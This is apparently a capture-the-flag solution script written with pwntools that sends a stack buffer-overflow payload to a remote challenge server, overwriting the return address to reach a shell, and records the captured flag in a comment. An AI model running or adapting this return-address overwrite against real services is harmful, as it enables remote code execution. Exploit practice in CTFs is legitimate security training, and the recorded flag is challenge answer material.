from pwn import *

context(arch = 'amd64', os = 'linux', terminal=['tmux', 'split-window', '-h'])

io = remote('game.sigflag.at', 3041)

# io = process("./pwn1")
# gdb.attach(io, gdbscript='b *0x400B83')

print(io.recvuntil(b">", drop=False))

payload = 32 * b"A"
payload += p64(0x0)             # rbp
payload += p64(0x400B87)        # rip, shell is 0x400b8e

io.sendline(payload)
io.interactive()

# SIG{Ev3Ry_d4y_1M_buFf3r1Ng}